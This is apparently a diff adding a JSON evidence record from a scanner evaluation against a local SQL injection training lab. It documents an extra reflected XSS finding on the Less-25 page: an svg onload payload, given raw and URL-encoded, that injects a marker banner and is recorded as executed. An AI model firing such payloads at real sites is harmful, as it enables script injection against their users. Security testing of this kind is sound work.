@@ -1,0 +1,11 @@
+{
+  "sample_id": "SQLI-003",
+  "scope_note": "tool-only additional reflected XSS, outside the 14-parent target label",
+  "url": "http://127.0.0.1:9081/Less-25/index.php?id=%3Csvg%20onload%3D%22window.__wp4xss%3D'WAP_LESS25_XSS'%3Bvar%20d%3Ddocument.createElement('div')%3Bd.style.background%3D'lime'%3Bd.style.fontSize%3D'28px'%3Bd.textContent%3D'WAP_LESS25_XSS'%3Bdocument.body.prepend(d)%22%3E",
+  "payload": "<svg onload=\"window.__wp4xss='WAP_LESS25_XSS';var d=document.createElement('div');d.style.background='lime';d.style.fontSize='28px';d.textContent='WAP_LESS25_XSS';document.body.prepend(d)\">",
+  "executed": true,
+  "marker_in_raw_html": true,
+  "page_errors": [],
+  "screenshot": "optional2/case_studies/less25_xss_browser.png",
+  "recorded_at": "2026-10-21T14:18:47.792Z"
+}
